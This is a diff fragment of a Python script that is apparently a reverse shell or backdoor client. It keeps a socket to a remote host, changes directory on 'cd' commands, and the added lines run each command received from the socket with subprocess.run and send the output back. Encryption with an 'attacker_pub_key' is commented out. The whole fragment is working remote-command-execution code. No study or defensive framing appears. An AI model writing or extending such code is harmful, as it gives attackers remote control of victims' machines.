@@ -24,9 +24,11 @@ try:
         if data[:2].decode() == 'cd':
             os.chdir(data[3:].decode())
         if len(data) > 0:
-            encrypted_data = asymmetric_encryption.encrypt_message(data.decode(), attacker_pub_key)
-            encrypted_data_b64 = encrypted_data.encode()
-            s.send(encrypted_data_b64)
+            result = subprocess.run(data.decode(), stdout=subprocess.PIPE, check=False)
+            s.send(result.stdout)
+            # encrypted_data = asymmetric_encryption.encrypt_message(data.decode(), pub_key)
+            # encrypted_data_b64 = encrypted_data.encode()
+            # s.send(encrypted_data_b64)
         else:
             s.send(b' ')
 except ConnectionResetError as e:
